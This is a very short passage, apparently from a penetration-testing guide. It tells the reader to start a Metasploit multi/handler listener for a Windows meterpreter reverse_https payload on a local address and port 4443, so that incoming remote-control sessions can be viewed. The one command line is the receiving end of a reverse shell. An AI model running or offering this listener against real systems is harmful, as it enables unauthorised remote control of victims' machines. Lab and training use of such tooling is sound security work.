Open up a terminal window and start the listener in order to see the current active sessions.

`msfconsole -q -x "use multi/handler; set payload windows/meterpreter/reverse_https; set LHOST 192.168.100.100; set LPORT 4443;set ExitOnSession false;exploit -j -z;"`

